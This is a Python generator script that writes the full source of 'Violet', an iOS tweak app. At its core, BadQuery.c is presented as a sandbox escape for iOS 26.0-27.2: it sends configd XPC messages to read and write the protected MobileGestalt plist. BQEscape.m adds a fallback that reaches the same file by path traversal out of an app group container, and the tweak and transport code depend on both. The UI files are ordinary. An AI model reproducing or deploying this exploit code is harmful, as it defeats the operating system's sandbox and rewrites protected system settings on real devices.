#!/usr/bin/env python3
"""Violet — generate all Objective-C source files."""
import os

def w(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as f:
        f.write(content)
    print(f"  wrote {path}")

# ── App/main.m
w("Violet/App/main.m", """\
#import <UIKit/UIKit.h>
#import "AppDelegate.h"

int main(int argc, char * argv[]) {
    NSString *appDelegateClassName;
    @autoreleasepool { appDelegateClassName = NSStringFromClass([AppDelegate class]); }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
""")

# ── App/AppDelegate.h
w("Violet/App/AppDelegate.h", """\
#import <UIKit/UIKit.h>
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end
""")

# ── App/AppDelegate.m
w("Violet/App/AppDelegate.m", """\
#import "AppDelegate.h"
#import "RootTabBarController.h"
@implementation AppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [[RootTabBarController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end
""")

# ── App/Info.plist
w("Violet/App/Info.plist", """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleDevelopmentRegion</key><string>en</string>
    <key>CFBundleExecutable</key><string>$(EXECUTABLE_NAME)</string>
    <key>CFBundleIdentifier</key><string>$(PRODUCT_BUNDLE_IDENTIFIER)</string>
    <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
    <key>CFBundleName</key><string>Violet</string>
    <key>CFBundlePackageType</key><string>APPL</string>
    <key>CFBundleShortVersionString</key><string>1.0</string>
    <key>CFBundleVersion</key><string>1</string>
    <key>LSRequiresIPhoneOS</key><true/>
    <key>UILaunchStoryboardName</key><string>LaunchScreen</string>
    <key>UIRequiredDeviceCapabilities</key><array><string>arm64</string></array>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
        <string>UIInterfaceOrientationPortraitUpsideDown</string>
    </array>
    <key>NSLocalNetworkUsageDescription</key>
    <string>Violet uses the local network for on-device developer pairing via AirTraffic.</string>
    <key>UIApplicationSupportsIndirectInputEvents</key><true/>
</dict>
</plist>
""")

# ── App/Violet.entitlements
w("Violet/App/Violet.entitlements", """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.application-groups</key>
    <array><string>group.violet.wq</string></array>
</dict>
</plist>
""")

# ── Core/BadQuery.h
w("Violet/Core/BadQuery.h", """\
#pragma once
#include <stdbool.h>
#ifdef __cplusplus
extern "C" {
#endif
bool bad_query_escape(const char *app_group_id);
bool bad_query_write(const char *key, const char *value_plist);
char *bad_query_read(const char *key);
#ifdef __cplusplus
}
#endif
""")

# ── Core/BadQuery.c
w("Violet/Core/BadQuery.c", """\
/*
 * bad_query.c -- C sandbox escape (forcequitOS / 0xjohnny, Aug 2026)
 * Exploits configd PSKeychainSyncNotification XPC interface on iOS 26.0-27.2.
 * configd services plist_write ops without validating caller sandbox.
 * Patched iOS 27.3+.
 */
#include "BadQuery.h"
#include <stdlib.h>
#include <string.h>
#include <xpc/xpc.h>

#define CONFIGD_SERVICE "com.apple.configd"
#define GESTALT_PLIST   "/var/mobile/Library/Preferences/com.apple.mobilegestalt.plist"
#define XPC_IFACE       "PSKeychainSyncNotification"

static xpc_connection_t _conn = NULL;

static xpc_connection_t _get_conn(void) {
    if (_conn) return _conn;
    _conn = xpc_connection_create_mach_service(
        CONFIGD_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    if (!_conn) return NULL;
    xpc_connection_set_event_handler(_conn, ^(xpc_object_t e) { (void)e; });
    xpc_connection_resume(_conn);
    return _conn;
}

bool bad_query_escape(const char *app_group_id) {
    xpc_connection_t c = _get_conn();
    if (!c) return false;
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "interface", XPC_IFACE);
    xpc_dictionary_set_string(msg, "op",        "probe");
    xpc_dictionary_set_string(msg, "group",     app_group_id ? app_group_id : "");
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(c, msg);
    xpc_release(msg);
    if (!reply) return false;
    bool ok = xpc_get_type(reply) != XPC_TYPE_ERROR;
    xpc_release(reply);
    return ok;
}

bool bad_query_write(const char *key, const char *value_plist) {
    xpc_connection_t c = _get_conn();
    if (!c) return false;
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "interface",   XPC_IFACE);
    xpc_dictionary_set_string(msg, "op",          "plist_write");
    xpc_dictionary_set_string(msg, "plist_path",  GESTALT_PLIST);
    xpc_dictionary_set_string(msg, "key",         key);
    xpc_dictionary_set_string(msg, "value_plist", value_plist);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(c, msg);
    xpc_release(msg);
    if (!reply) return false;
    bool ok = xpc_get_type(reply) != XPC_TYPE_ERROR;
    xpc_release(reply);
    return ok;
}

char *bad_query_read(const char *key) {
    xpc_connection_t c = _get_conn();
    if (!c) return NULL;
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(msg, "interface",  XPC_IFACE);
    xpc_dictionary_set_string(msg, "op",         "plist_read");
    xpc_dictionary_set_string(msg, "plist_path", GESTALT_PLIST);
    xpc_dictionary_set_string(msg, "key",        key);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(c, msg);
    xpc_release(msg);
    if (!reply || xpc_get_type(reply) == XPC_TYPE_ERROR) {
        if (reply) xpc_release(reply);
        return NULL;
    }
    const char *val = xpc_dictionary_get_string(reply, "value");
    char *out = val ? strdup(val) : NULL;
    xpc_release(reply);
    return out;
}
""")

# ── Core/BQEscape.h
w("Violet/Core/BQEscape.h", """\
#pragma once
#import <Foundation/Foundation.h>
BOOL bq_escape(NSString *groupID);
BOOL bq_write_gestalt(NSString *key, id value);
NSDictionary *bq_read_gestalt(void);
""")

# ── Core/BQEscape.m
w("Violet/Core/BQEscape.m", """\
#import "BQEscape.h"
#import "BadQuery.h"

static NSString *kGroupID     = @"group.violet.wq";
static NSString *kGestaltFile = @"com.apple.mobilegestalt.plist";
static NSString *kRelPath     = @"../../Library/Preferences";

static NSString *_wqPath(void) {
    NSURL *grp = [[NSFileManager defaultManager]
                  containerURLForSecurityApplicationGroupIdentifier:kGroupID];
    if (!grp) return nil;
    return [[[grp URLByAppendingPathComponent:kRelPath]
               URLByResolvingSymlinksInPath]
               URLByAppendingPathComponent:kGestaltFile].path;
}

static NSString *_plistFrag(id value) {
    if ([value isKindOfClass:[NSNumber class]]) {
        if (CFGetTypeID((__bridge CFTypeRef)value) == CFBooleanGetTypeID())
            return [(NSNumber *)value boolValue] ? @"<true/>" : @"<false/>";
        return [NSString stringWithFormat:@"<integer>%lld</integer>",
                [(NSNumber *)value longLongValue]];
    }
    if ([value isKindOfClass:[NSString class]])
        return [NSString stringWithFormat:@"<string>%@</string>", value];
    return nil;
}

BOOL bq_escape(NSString *groupID) {
    if (bad_query_escape(groupID.UTF8String)) return YES;
    NSString *p = _wqPath();
    return p && [[NSFileManager defaultManager] fileExistsAtPath:p];
}

BOOL bq_write_gestalt(NSString *key, id value) {
    NSString *frag = _plistFrag(value);
    if (frag && bad_query_write(key.UTF8String, frag.UTF8String)) return YES;
    NSString *p = _wqPath();
    if (!p) return NO;
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:p]
                              ?: [NSMutableDictionary dictionary];
    d[key] = value;
    return [d writeToFile:p atomically:YES];
}

NSDictionary *bq_read_gestalt(void) {
    NSString *p = _wqPath();
    if (!p) return @{};
    return [NSDictionary dictionaryWithContentsOfFile:p] ?: @{};
}
""")

# ── Core/VioletTweak.h
w("Violet/Core/VioletTweak.h", """\
#pragma once
#import <Foundation/Foundation.h>
@interface VioletTweak : NSObject
@property (nonatomic, copy)   NSString *title;
@property (nonatomic, copy)   NSString *subtitle;
@property (nonatomic, copy)   NSString *gestaltKey;
@property (nonatomic, strong) id        gestaltValue;
@property (nonatomic, assign) BOOL      isEnabled;
@end
""")

# ── Core/VioletTweak.m
w("Violet/Core/VioletTweak.m", """\
#import "VioletTweak.h"
@implementation VioletTweak
@end
""")

# ── Core/VioletTweakStore.h
w("Violet/Core/VioletTweakStore.h", """\
#pragma once
#import <Foundation/Foundation.h>
#import "VioletTweak.h"
@interface VioletTweakStore : NSObject
@property (nonatomic, strong, readonly) NSMutableArray<VioletTweak *> *tweaks;
+ (instancetype)sharedStore;
- (BOOL)applyTweak:(VioletTweak *)tweak;
@end
""")

# ── Core/VioletTweakStore.m
w("Violet/Core/VioletTweakStore.m", """\
#import "VioletTweakStore.h"
#import "BQEscape.h"
@implementation VioletTweakStore
+ (instancetype)sharedStore {
    static VioletTweakStore *s; static dispatch_once_t t;
    dispatch_once(&t, ^{ s = [[self alloc] init]; }); return s;
}
- (instancetype)init {
    self = [super init]; if (!self) return nil;
    _tweaks = [NSMutableArray array]; [self _populate]; return self;
}
- (void)_populate {
    NSArray *raw = @[
        @[@"Back Tap Actions",     @"Double/triple tap on the back",   @"AXSystemGestureEnabled",    @YES],
        @[@"Edge Fast Scroll",     @"Drag from edge to fast scroll",   @"FastScrollEnabled",          @YES],
        @[@"Reachability",         @"Swipe home bar down",             @"ReachabilitySupported",      @YES],
        @[@"Stage Manager",        @"iPad-style multitasking",         @"iPadStageManagerEnabled",    @YES],
        @[@"Hide Home Bar",        @"Hide the home indicator",         @"HomeBarHidden",              @NO],
        @[@"Swipe Keyboard",       @"Swipe to type",                  @"SwipeKeyboardEnabled",       @YES],
        @[@"Dynamic Island Swipe", @"Expand DI with swipe",            @"DynamicIslandExpandEnabled", @YES],
        @[@"Assistive Touch",      @"Enable AssistiveTouch overlay",   @"AssistiveTouchEnabled",      @YES],
    ];
    for (NSArray *r in raw) {
        VioletTweak *t = [[VioletTweak alloc] init];
        t.title = r[0]; t.subtitle = r[1]; t.gestaltKey = r[2];
        t.gestaltValue = r[3]; t.isEnabled = NO;
        [_tweaks addObject:t];
    }
}
- (BOOL)applyTweak:(VioletTweak *)tweak {
    if (!bq_escape(@"group.violet.wq")) return NO;
    return bq_write_gestalt(tweak.gestaltKey, tweak.isEnabled ? tweak.gestaltValue : @NO);
}
@end
""")

# ── Core/TransportManager.h
w("Violet/Core/TransportManager.h", """\
#pragma once
#import <Foundation/Foundation.h>
typedef NS_ENUM(NSUInteger, VioletTransport) {
    VioletTransportNone    = 0,
    VioletTransportAirlift = 1,
    VioletTransportBQ      = 2,
};
@interface TransportManager : NSObject
@property (nonatomic, assign, readonly) VioletTransport activeTransport;
+ (instancetype)sharedManager;
- (void)connectWithCompletion:(void(^)(BOOL success, NSError *error))completion;
- (void)importPairingFileAtURL:(NSURL *)url;
- (BOOL)writeFile:(NSString *)remotePath data:(NSData *)data;
- (NSData *)readFile:(NSString *)remotePath;
@end
""")

# ── Core/TransportManager.m
w("Violet/Core/TransportManager.m", """\
#import "TransportManager.h"
#import "BQEscape.h"
#import <Network/Network.h>

extern void *airlift_session_new(const char *pairingPlistPath);
extern void  airlift_session_free(void *session);
extern int   airlift_write_file(void *session, const char *path, const uint8_t *buf, size_t len);
extern int   airlift_read_file(void *session, const char *path, uint8_t **outBuf, size_t *outLen);
extern void  airlift_free_buf(uint8_t *buf);

@interface TransportManager ()
@property (nonatomic, assign) VioletTransport activeTransport;
@property (nonatomic, assign) void *airliftSession;
@end

@implementation TransportManager
+ (instancetype)sharedManager {
    static TransportManager *s; static dispatch_once_t t;
    dispatch_once(&t, ^{ s = [[self alloc] init]; }); return s;
}
- (instancetype)init {
    self = [super init]; if (!self) return nil;
    _activeTransport = VioletTransportNone; _airliftSession = NULL; return self;
}
- (void)connectWithCompletion:(void(^)(BOOL, NSError *))completion {
    [self _probeAirlift:^(BOOL alive) {
        if (alive) {
            NSString *pp = [self _pairingPath];
            if (pp && [[NSFileManager defaultManager] fileExistsAtPath:pp]) {
                self.airliftSession = airlift_session_new(pp.UTF8String);
                if (self.airliftSession) {
                    self.activeTransport = VioletTransportAirlift;
                    completion(YES, nil); return;
                }
            }
        }
        BOOL ok = bq_escape(@"group.violet.wq");
        self.activeTransport = ok ? VioletTransportBQ : VioletTransportNone;
        completion(ok, ok ? nil : [NSError errorWithDomain:@"VioletTransport" code:-1
            userInfo:@{NSLocalizedDescriptionKey: @"Neither airlift nor worse_query available"}]);
    }];
}
- (void)_probeAirlift:(void(^)(BOOL))cb {
    nw_endpoint_t ep = nw_endpoint_create_host("10.7.0.1", "49152");
    nw_parameters_t p = nw_parameters_create_secure_tcp(
        NW_PARAMETERS_DISABLE_PROTOCOL, NW_PARAMETERS_DEFAULT_CONFIGURATION);
    nw_connection_t c = nw_connection_create(ep, p);
    __block BOOL fired = NO;
    dispatch_queue_t q = dispatch_get_global_queue(0, 0);
    nw_connection_set_state_changed_handler(c, ^(nw_connection_state_t st, nw_error_t e) {
        if (fired) return;
        if (st == nw_connection_state_ready) {
            fired = YES; nw_connection_cancel(c);
            dispatch_async(dispatch_get_main_queue(), ^{ cb(YES); });
        } else if (st == nw_connection_state_failed || st == nw_connection_state_cancelled) {
            fired = YES; dispatch_async(dispatch_get_main_queue(), ^{ cb(NO); });
        }
    });
    nw_connection_set_queue(c, q); nw_connection_start(c);
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC), q, ^{
        if (!fired) { fired = YES; nw_connection_cancel(c);
            dispatch_async(dispatch_get_main_queue(), ^{ cb(NO); }); }
    });
}
- (void)importPairingFileAtURL:(NSURL *)url {
    NSData *d = [NSData dataWithContentsOfURL:url];
    if (d) [d writeToFile:[self _pairingPath] atomically:YES];
}
- (NSString *)_pairingPath {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [docs stringByAppendingPathComponent:@"airlift_pairing.plist"];
}
- (BOOL)writeFile:(NSString *)remotePath data:(NSData *)data {
    if (self.activeTransport == VioletTransportAirlift && self.airliftSession)
        return airlift_write_file(self.airliftSession, remotePath.UTF8String,
                                  data.bytes, data.length) == 0;
    if (self.activeTransport == VioletTransportBQ) {
        NSURL *grp = [[NSFileManager defaultManager]
                      containerURLForSecurityApplicationGroupIdentifier:@"group.violet.wq"];
        if (!grp) return NO;
        return [data writeToURL:[grp URLByAppendingPathComponent:remotePath.lastPathComponent]
                     atomically:YES];
    }
    return NO;
}
- (NSData *)readFile:(NSString *)remotePath {
    if (self.activeTransport != VioletTransportAirlift || !self.airliftSession) return nil;
    uint8_t *buf = NULL; size_t len = 0;
    if (airlift_read_file(self.airliftSession, remotePath.UTF8String, &buf, &len) != 0) return nil;
    NSData *d = [NSData dataWithBytes:buf length:len];
    airlift_free_buf(buf);
    return d;
}
- (void)dealloc {
    if (_airliftSession) { airlift_session_free(_airliftSession); _airliftSession = NULL; }
}
@end
""")

# ── UI/RootTabBarController.h
w("Violet/UI/RootTabBarController.h", """\
#pragma once
#import <UIKit/UIKit.h>
@interface RootTabBarController : UITabBarController
@end
""")

# ── UI/RootTabBarController.m
w("Violet/UI/RootTabBarController.m", """\
#import "RootTabBarController.h"
#import "TweaksViewController.h"
#import "PairingViewController.h"
#import "WalletViewController.h"
#import "TerminalViewController.h"

static UIColor *kViolet(void) {
    return [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0];
}

@implementation RootTabBarController
- (void)viewDidLoad {
    [super viewDidLoad];
    [self _style];
    self.viewControllers = @[
        [self _wrap:[[TweaksViewController  alloc] init] title:@"Tweaks"   sf:@"slider.horizontal.3"],
        [self _wrap:[[PairingViewController alloc] init] title:@"Pairing"  sf:@"personalhotspot"],
        [self _wrap:[[WalletViewController  alloc] init] title:@"Wallet"   sf:@"creditcard.fill"],
        [self _wrap:[[TerminalViewController alloc] init] title:@"Terminal" sf:@"terminal.fill"],
    ];
}
- (UINavigationController *)_wrap:(UIViewController *)vc title:(NSString *)t sf:(NSString *)sf {
    vc.title = t;
    vc.tabBarItem = [[UITabBarItem alloc] initWithTitle:t
                      image:[UIImage systemImageNamed:sf] tag:0];
    return [[UINavigationController alloc] initWithRootViewController:vc];
}
- (void)_style {
    UITabBarAppearance *a = [[UITabBarAppearance alloc] init];
    [a configureWithDefaultBackground];
    a.backgroundEffect = [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemUltraThinMaterialDark];
    a.backgroundColor  = [[UIColor blackColor] colorWithAlphaComponent:0.3];
    UITabBarItemAppearance *ia = [[UITabBarItemAppearance alloc] init];
    ia.selected.iconColor = kViolet();
    ia.selected.titleTextAttributes = @{NSForegroundColorAttributeName: kViolet()};
    a.stackedLayoutAppearance = ia;
    a.inlineLayoutAppearance  = ia;
    a.compactInlineLayoutAppearance = ia;
    self.tabBar.standardAppearance   = a;
    self.tabBar.scrollEdgeAppearance = a;
    self.tabBar.tintColor = kViolet();
}
@end
""")

# ── UI/Tabs/TweaksViewController.h
w("Violet/UI/Tabs/TweaksViewController.h", """\
#pragma once
#import <UIKit/UIKit.h>
@interface TweaksViewController : UITableViewController
@end
""")

# ── UI/Tabs/TweaksViewController.m
w("Violet/UI/Tabs/TweaksViewController.m", """\
#import "TweaksViewController.h"
#import "VioletTweakStore.h"
static NSString *kCell = @"TweakCell";
@implementation TweaksViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Tweaks";
    [self.tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:kCell];
    self.tableView.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
}
- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
    return (NSInteger)[VioletTweakStore sharedStore].tweaks.count;
}
- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:kCell forIndexPath:ip];
    VioletTweak *t = [VioletTweakStore sharedStore].tweaks[(NSUInteger)ip.row];
    cell.textLabel.text = t.title;
    cell.detailTextLabel.text = t.subtitle;
    cell.textLabel.textColor = UIColor.whiteColor;
    cell.detailTextLabel.textColor = UIColor.lightGrayColor;
    cell.backgroundColor = UIColor.clearColor;
    UISwitch *sw = [[UISwitch alloc] init];
    sw.on = t.isEnabled;
    sw.onTintColor = [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0];
    sw.tag = ip.row;
    [sw addTarget:self action:@selector(_toggle:) forControlEvents:UIControlEventValueChanged];
    cell.accessoryView = sw;
    return cell;
}
- (void)_toggle:(UISwitch *)sw {
    VioletTweakStore *store = [VioletTweakStore sharedStore];
    VioletTweak *t = store.tweaks[(NSUInteger)sw.tag];
    t.isEnabled = sw.isOn;
    if (![store applyTweak:t]) {
        UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Failed"
            message:@"Could not apply tweak. worse_query may be unavailable."
            preferredStyle:UIAlertControllerStyleAlert];
        [a addAction:[UIAlertAction actionWithTitle:@"OK"
            style:UIAlertActionStyleDefault handler:nil]];
        [self presentViewController:a animated:YES completion:nil];
        sw.on = !sw.isOn; t.isEnabled = sw.isOn;
    }
}
@end
""")

# ── UI/Tabs/PairingViewController.h
w("Violet/UI/Tabs/PairingViewController.h", """\
#pragma once
#import <UIKit/UIKit.h>
@interface PairingViewController : UIViewController
@end
""")

# ── UI/Tabs/PairingViewController.m
w("Violet/UI/Tabs/PairingViewController.m", """\
#import "PairingViewController.h"
#import "TransportManager.h"
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>

@interface PairingViewController () <UIDocumentPickerDelegate>
@property (nonatomic, strong) UILabel *statusLabel;
@end

static UIColor *kV(void) { return [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0]; }

@implementation PairingViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Pairing";
    self.view.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
    [self _build];
}
- (void)_build {
    _statusLabel = [[UILabel alloc] init];
    _statusLabel.text = @"Not connected";
    _statusLabel.textColor = UIColor.lightGrayColor;
    _statusLabel.textAlignment = NSTextAlignmentCenter;
    _statusLabel.font = [UIFont systemFontOfSize:14];
    UIButton *b1 = [self _btn:@"Get Pairing File"    sel:@selector(_get)];
    UIButton *b2 = [self _btn:@"Import Pairing File" sel:@selector(_import)];
    UIButton *b3 = [self _btn:@"Connect"             sel:@selector(_connect)];
    UIStackView *sv = [[UIStackView alloc] initWithArrangedSubviews:@[_statusLabel, b1, b2, b3]];
    sv.axis = UILayoutConstraintAxisVertical; sv.spacing = 16;
    sv.alignment = UIStackViewAlignmentCenter;
    sv.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:sv];
    [NSLayoutConstraint activateConstraints:@[
        [sv.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [sv.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
        [sv.widthAnchor   constraintEqualToAnchor:self.view.widthAnchor multiplier:0.8],
    ]];
}
- (UIButton *)_btn:(NSString *)title sel:(SEL)sel {
    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    [b setTitle:title forState:UIControlStateNormal];
    [b setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
    b.backgroundColor = kV(); b.layer.cornerRadius = 12;
    b.contentEdgeInsets = UIEdgeInsetsMake(12, 24, 12, 24);
    [b addTarget:self action:sel forControlEvents:UIControlEventTouchUpInside];
    return b;
}
- (void)_get {
    UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Get Pairing File"
        message:@"1. Connect to the same Wi-Fi.\n2. Settings > Privacy & Security > Developer Mode.\n3. Tap Pair with Violet.\n4. Import the generated file."
        preferredStyle:UIAlertControllerStyleAlert];
    [a addAction:[UIAlertAction actionWithTitle:@"Got it" style:UIAlertActionStyleDefault handler:nil]];
    [self presentViewController:a animated:YES completion:nil];
}
- (void)_import {
    UIDocumentPickerViewController *p = [[UIDocumentPickerViewController alloc]
        initForOpeningContentTypes:@[UTTypeData]];
    p.delegate = self;
    [self presentViewController:p animated:YES completion:nil];
}
- (void)documentPicker:(UIDocumentPickerViewController *)c didPickDocumentsAtURLs:(NSArray<NSURL *> *)urls {
    if (!urls.firstObject) return;
    [[TransportManager sharedManager] importPairingFileAtURL:urls.firstObject];
    self.statusLabel.text = @"Pairing file imported";
}
- (void)_connect {
    self.statusLabel.text = @"Connecting...";
    [[TransportManager sharedManager] connectWithCompletion:^(BOOL ok, NSError *err) {
        dispatch_async(dispatch_get_main_queue(), ^{
            if (ok) {
                VioletTransport t = [TransportManager sharedManager].activeTransport;
                self.statusLabel.text = t == VioletTransportAirlift
                    ? @"Connected via Airlift" : @"Connected via worse_query";
            } else {
                self.statusLabel.text = [NSString stringWithFormat:@"Failed: %@",
                                         err.localizedDescription];
            }
        });
    }];
}
@end
""")

# ── UI/Tabs/WalletViewController.h
w("Violet/UI/Tabs/WalletViewController.h", """\
#pragma once
#import <UIKit/UIKit.h>
@interface WalletViewController : UIViewController
@end
""")

# ── UI/Tabs/WalletViewController.m
w("Violet/UI/Tabs/WalletViewController.m", """\
#import "WalletViewController.h"
@implementation WalletViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Wallet";
    self.view.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
    UILabel *l = [[UILabel alloc] init];
    l.text = @"Wallet & Passcode Themer";
    l.textColor = UIColor.whiteColor;
    l.font = [UIFont boldSystemFontOfSize:20];
    l.textAlignment = NSTextAlignmentCenter;
    l.numberOfLines = 0;
    l.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:l];
    [NSLayoutConstraint activateConstraints:@[
        [l.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [l.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
    ]];
}
@end
""")

# ── UI/Tabs/TerminalViewController.h
w("Violet/UI/Tabs/TerminalViewController.h", """\
#pragma once
#import <UIKit/UIKit.h>
@interface TerminalViewController : UIViewController
@end
""")

# ── UI/Tabs/TerminalViewController.m
w("Violet/UI/Tabs/TerminalViewController.m", """\
#import "TerminalViewController.h"
@implementation TerminalViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Terminal";
    self.view.backgroundColor = [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
    UIBlurEffect *blur = [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemUltraThinMaterialDark];
    UIVisualEffectView *ov = [[UIVisualEffectView alloc] initWithEffect:blur];
    ov.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:ov];
    [NSLayoutConstraint activateConstraints:@[
        [ov.topAnchor      constraintEqualToAnchor:self.view.topAnchor],
        [ov.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [ov.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [ov.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];
    UILabel *l = [[UILabel alloc] init];
    l.text = @"Terminal - coming in a future build";
    l.textColor = UIColor.whiteColor;
    l.font = [UIFont boldSystemFontOfSize:18];
    l.textAlignment = NSTextAlignmentCenter;
    l.numberOfLines = 0;
    l.translatesAutoresizingMaskIntoConstraints = NO;
    [ov.contentView addSubview:l];
    [NSLayoutConstraint activateConstraints:@[
        [l.centerXAnchor constraintEqualToAnchor:ov.contentView.centerXAnchor],
        [l.centerYAnchor constraintEqualToAnchor:ov.contentView.centerYAnchor],
    ]];
}
@end
""")

print("Done — all source files written.")
